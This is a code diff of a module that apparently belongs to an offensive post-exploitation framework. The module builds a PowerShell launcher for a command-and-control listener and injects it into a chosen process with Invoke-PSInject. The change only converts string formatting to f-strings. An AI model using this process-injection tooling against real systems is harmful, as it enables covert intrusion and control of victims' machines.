@@ -40,7 +40,7 @@ class Module:
         script_end = ""
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
+            return handle_error_message(f"[!] Invalid listener: {listener_name}")
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
@@ -62,15 +62,11 @@ class Module:
                 launcher_code = launcher.split(" ")[-1]
 
                 if proc_id != "":
-                    script_end += "Invoke-PSInject -ProcID {} -PoshCode {}".format(
-                        proc_id,
-                        launcher_code,
+                    script_end += (
+                        f"Invoke-PSInject -ProcID {proc_id} -PoshCode {launcher_code}"
                     )
                 else:
-                    script_end += "Invoke-PSInject -ProcName {} -PoshCode {}".format(
-                        proc_name,
-                        launcher_code,
-                    )
+                    script_end += f"Invoke-PSInject -ProcName {proc_name} -PoshCode {launcher_code}"
 
         script = main_menu.modulesv2.finalize_module(
             script=script,
